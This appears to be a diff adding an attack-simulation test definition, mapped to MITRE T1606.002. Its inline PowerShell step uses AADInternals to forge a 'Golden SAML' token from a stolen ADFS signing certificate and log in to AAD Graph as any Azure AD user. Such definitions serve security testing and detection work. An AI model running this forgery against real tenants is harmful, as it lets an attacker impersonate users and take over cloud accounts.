@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Golden SAML
+description: "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n"
+args:
+    - name: certificate_path
+      type: path
+      default: .\ADFS_signing.pfx
+    - name: immutable_id
+      type: string
+      default: aehgdqBTZV50DKQZmNJ8mg==
+    - name: issuer_uri
+      type: string
+      default: http://contoso.com/adfs/services/trust/
+uuid: b16a03bc-1089-4dcc-ad98-30fe8f3a2b31
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1606: Forge Web Credentials'
+    subtechniques:
+        - 'T1606.002: SAML Tokens'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: golden-saml
+      inline: |
+        Import-Module AADInternals -Force
+        $saml = New-AADIntSAMLToken -ImmutableID "{{.Args.immutable_id}}" -PfxFileName "{{.Args.certificate_path}}" -Issuer "{{.Args.issuer_uri}}"
+        $conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
+        if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
+        Write-Host "End of Golden SAML"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
